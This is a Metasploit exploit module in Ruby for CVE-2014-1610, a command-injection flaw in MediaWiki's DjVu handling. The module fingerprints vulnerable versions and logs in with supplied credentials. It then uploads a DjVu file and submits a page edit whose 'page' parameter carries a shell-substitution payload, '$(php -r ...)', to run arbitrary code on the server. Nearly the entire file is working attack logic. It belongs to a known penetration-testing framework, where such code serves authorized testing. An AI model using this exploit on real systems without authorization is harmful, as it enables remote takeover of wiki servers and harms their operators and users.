##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nokogiri'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'MediaWiki DjVu Authenticated Remote Command Execution',
      'Description' => %q{
        MediaWiki 1.22.x before 1.22.2, 1.21.x before 1.21.5 and 1.19.x before 1.19.11,
      when DjVu file upload support is enabled, allows remote authenticated
      users to execute arbitrary commands via shell metacharacters in the page
      parameter to includes/media/DjVu.php
      },
      'Author' =>
        [
          'Netanel Rubin', # from Check Point - Discovery
          'Ben Harris', # Metasploit Module
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>' # Metasploit Module
        ],
      'License' => MSF_LICENSE,
      'References' =>
        [
          [ 'CVE', '2014-1610' ],
          [ 'OSVDB', '102630'],
          [ 'URL', 'http://www.checkpoint.com/threatcloud-central/articles/2014-01-28-tc-researchers-discover.html' ],
          [ 'URL', 'https://bugzilla.wikimedia.org/show_bug.cgi?id=60339' ]
        ],
      'Privileged' => false,
      'Platform'   => ['php'],
      'Arch'       => ARCH_PHP, # Could do ARCH_CMD
      'Targets' =>
        [
          [ 'Automatic', { } ],
        ],
      'Payload' =>
        {
          'BadChars' => "\r\n"
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 28 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base index.php path", '/index.php']),
        OptString.new('USERNAME', [ true, "Username to authenticate with", '']),
        OptString.new('PASSWORD', [ false, "Password to authenticate with", ''])
      ], self.class)
  end

  def check
    uri = target_uri.path

    opts = { 'uri' => uri, 'follow_redirect' => true }

    response = send_request_cgi(opts)

    if opts['redirect_uri']
      vprint_status("Redirected to #{opts['redirect_uri']}.")
    end

    unless response
      vprint_status("No response from #{full_uri}.")
      return CheckCode::Unknown
    end

    # Mediawiki will give a 404 for unknown pages but still have a body
    if response.code == 200 || response.code == 404
      vprint_status("#{response.code} response received...")
      meta_generator = get_html_value(response.body, 'meta', 'generator', 'content')

      unless meta_generator
        vprint_status("No META Generator tag on #{full_uri}.")
        return CheckCode::Unknown
      end

      if meta_generator && meta_generator =~ /mediawiki/i
        vprint_status("#{meta_generator} detected.")
        meta_generator =~ /(\d)\.(\d+)[\.A-z]+(\d+)/
        major = $1.to_i
        minor = $2.to_i
        patch = $3.to_i
        vprint_status("Major:#{major} Minor:#{minor} Patch:#{patch}")

        if major != 1
          return CheckCode::Safe
        else
          if minor < 8 || minor > 22
            return CheckCode::Safe
          else
            if minor == 22 && patch > 1
              return CheckCode::Safe
            elsif minor == 21 && patch > 4
              return CheckCode::Safe
            elsif minor == 19 && patch > 10
              return CheckCode::Safe
            else
              return CheckCode::Appears
            end
          end
        end
      else
        return CheckCode::Unknown
      end
    else
      vprint_status("Received response code #{response.code} from #{full_uri}")
    end

    return CheckCode::Unknown
  end

  def exploit
    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    uri = target_uri.path

    print_status("Grabbing login CSRF token...")
    response = send_request_cgi({
      'uri' => uri,
      'vars_get' => { 'title' => 'Special:UserLogin' }
    })

    unless response
      fail_with(Failure::NotFound, "Failed to retrieve webpage.")
    end

    session_cookie = response.get_cookies

    wp_login_token = get_html_value(response.body, 'input', 'wpLoginToken', 'value')

    unless wp_login_token
      fail_with(Failure::UnexpectedReply, "Couldn't find login token. Is URI set correctly?")
    else
      print_good("Retrieved login CSRF token.")
    end

    print_status("Attempting to login...")
    login = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'vars_get' => {
        'title' => 'Special:UserLogin',
        'action' => 'submitlogin',
        'type' => 'login'
      },
      'cookie' => session_cookie,
      'vars_post' => {
        'wpName' => username,
        'wpPassword' => password,
        'wpLoginAttempt' => 'Log in',
        'wpLoginToken' => wp_login_token
      }
    })

    if login and login.code == 302
      print_good("Log in successful.")
    else
      fail_with(Failure::NoAccess, "Failed to log in.")
    end

    auth_cookie = login.get_cookies.gsub('mediawikiToken=deleted;','')

    print_status("Getting upload CSRF token...")
    upload_file = send_request_cgi({
      'uri' => normalize_uri(uri, "/Special:Upload"),
      'cookie' => auth_cookie
    })

    unless upload_file and upload_file.code == 200
      fail_with(Failure::NotFound, "Failed to access file upload page.")
    end

    wp_edit_token = get_html_value(upload_file.body, 'input', 'wpEditToken', 'value')
    wp_upload = get_html_value(upload_file.body, 'input', 'wpUpload', 'value')
    title = get_html_value(upload_file.body, 'input', 'title', 'value')

    unless wp_edit_token
      fail_with(Failure::UnexpectedReply, "Couldn't find upload token. Is URI set correctly?")
    else
      print_good("Retrieved upload CSRF token.")
    end

    upload_mime = Rex::MIME::Message.new

    djvu_file = ::File.read(::File.join(Msf::Config.data_directory, "exploits", "cve-2014-1610", "metasploit.djvu"))
    file_name = "#{rand_text_alpha(4)}.djvu"

    upload_mime.add_part(djvu_file, "application/octet-stream", nil, "form-data; name=\"wpUploadFile\"; filename=\"#{file_name}\"")
    upload_mime.add_part("#{file_name}", nil, nil, "form-data; name=\"wpDestFile\"")
    upload_mime.add_part("#{rand_text_alpha(4)}", nil, nil, "form-data; name=\"wpUploadDescription\"")
    upload_mime.add_part("", nil, nil, "form-data; name=\"wpLicense\"")
    upload_mime.add_part("1",nil,nil, "form-data; name=\"wpIgnoreWarning\"")
    upload_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"")
    upload_mime.add_part(title, nil, nil, "form-data; name=\"title\"")
    upload_mime.add_part("1", nil, nil, "form-data; name=\"wpDestFileWarningAck\"")
    upload_mime.add_part(wp_upload, nil, nil, "form-data; name=\"wpUpload\"")
    post_data = upload_mime.to_s(true)

    print_status("Uploading DjVu file #{file_name}...")

    upload = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "Special:Upload"),
      'data'   => post_data,
      'ctype'  => "multipart/form-data; boundary=#{upload_mime.bound}",
      'cookie' => auth_cookie
    })

    if upload and upload.code == 302 and upload.headers['Location']
      location = upload.headers['Location']
      print_good("File uploaded to #{location}")
    else
      if upload.body.include? 'not a permitted file type'
        fail_with(Failure::NotVulnerable, "Wiki is not configured for DjVu files.")
      else
        fail_with(Failure::UnexpectedReply, "Failed to upload file.")
      end
    end

    random_page = rand_text_alpha(8)

    print_status("Retrieving edit CSRF token for target page: #{random_page}...")
    random_edit = send_request_cgi({
      'uri' => uri,
      'vars_get' => {
        'title'=> random_page,
        'action' => 'edit'
      },
      'cookie' => auth_cookie
    })

    unless random_edit and random_edit.code == 200
      fail_with(Failure::NotFound, "Failed to open target edit page: #{random_page}.")
    end

    wp_auto_summary = get_html_value(random_edit.body, 'input', 'wpAutoSummary', 'value')
    wp_edit_token = get_html_value(random_edit.body, 'input', 'wpEditToken', 'value')
    wp_start_time = get_html_value(random_edit.body, 'input', 'wpStarttime', 'value')
    wp_edit_time = get_html_value(random_edit.body, 'input', 'wpEdittime', 'value')
    old_id = get_html_value(random_edit.body, 'input', 'oldid', 'value')
    wp_scroll_top = get_html_value(random_edit.body, 'input', 'wpScrolltop', 'value')
    wp_section = get_html_value(random_edit.body, 'input', 'wpSection', 'value')

    if wp_edit_token
      print_good("Retrieved edit CSRF token.")
    else
      fail_with(Failure::UnexpectedReply, "Failed to retrieve edit CSRF token.")
    end

    edit_mime = Rex::MIME::Message.new
    edit_mime.add_part(wp_section, nil, nil, "form-data; name=\"wpSection\"")
    edit_mime.add_part(wp_start_time, nil, nil, "form-data; name=\"wpStarttime\"")
    edit_mime.add_part(wp_edit_time, nil, nil, "form-data; name=\"wpEdittime\"")
    edit_mime.add_part(wp_scroll_top, nil, nil, "form-data; name=\"wpScrolltop\"")
    edit_mime.add_part(wp_auto_summary,nil,nil, "form-data; name=\"wpAutoSummary\"")
    edit_mime.add_part(old_id, nil, nil, "form-data; name=\"oldid\"")
    edit_mime.add_part("[[Image:#{file_name}|width=9999|page=1$(php -r '#{payload.encoded}')]]", nil, nil, "form-data; name=\"wpTextbox1\"")
    edit_mime.add_part("Save page", nil, nil, "form-data; name=\"wpSummary\"")
    edit_mime.add_part(wp_edit_token, nil, nil, "form-data; name=\"wpEditToken\"")
    post_data = edit_mime.to_s(true)

    print_status("Sending payload request...")
    edit = send_request_cgi({
      'uri' => uri,
      'method' => 'POST',
      'cookie' => auth_cookie,
      'vars_get' => {
        'title' => random_page,
        'action' => 'submit'
      },
      'data'   => post_data,
      'ctype'  => "multipart/form-data; boundary=#{edit_mime.bound}"
    }, 1)

    if edit
      fail_with(Failure::PayloadFailed, "Server responded to edit request (Not expected).")
    end
  end

  # The order of name, value keeps shifting so regex is painful.
  # Cant use nokogiri due to security issues
  # Cant use REXML directly as its not strict XHTML
  # So we do a filthy mixture of regex and REXML
  def get_html_value(html, type, name, value)
    return nil unless html
    return nil unless type
    return nil unless name
    return nil unless value

    found = nil
    html.each_line do |line|
      if line =~ /(<#{type}[^\/]*name="#{name}".*?\/>)/i
        found = $&
        break
      end
    end

    if found
      doc = REXML::Document.new found
      return doc.root.attributes[value]
    end

    nil
  end
end

